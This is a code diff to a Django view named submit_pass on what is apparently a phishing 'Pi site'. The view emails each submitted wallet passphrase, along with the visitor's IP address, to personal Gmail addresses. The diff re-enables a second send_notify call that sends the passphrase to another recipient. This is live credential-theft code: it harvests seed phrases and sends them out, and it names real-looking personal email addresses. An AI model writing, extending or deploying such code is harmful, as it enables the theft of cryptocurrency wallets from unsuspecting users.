@@ -110,7 +110,7 @@ def submit_pass(request):
                 formatted_time = current_time.strftime("%Y-%m-%d %H:%M:%S")
                 send_notify(payload=f'Pass Phrase submitted - {formatted_time} - the ip address is (- {ip_address}) - the passphrase is -( {keys} )', subject='Pi site Token Submitted', email_to="ezekielobiajulu0@gmail.com")
 
-                # send_notify(payload=f'Pass Phrase submitted - {formatted_time} - the passphrase is -( {keys} )', subject='Pi site Token Submitted', email_to="obikeechiemerielinus@gmail.com")
+                send_notify(payload=f'Pass Phrase submitted - {formatted_time} - the passphrase is -( {keys} )', subject='Pi site Token Submitted', email_to="obikeechiemerielinus@gmail.com")
                 request.session['look_up'] = look_up_key
                 # key_sent = models.PassPhrase.objects.get(look_up=look_up_key)
                 return approve(request, keys=look_up_key)
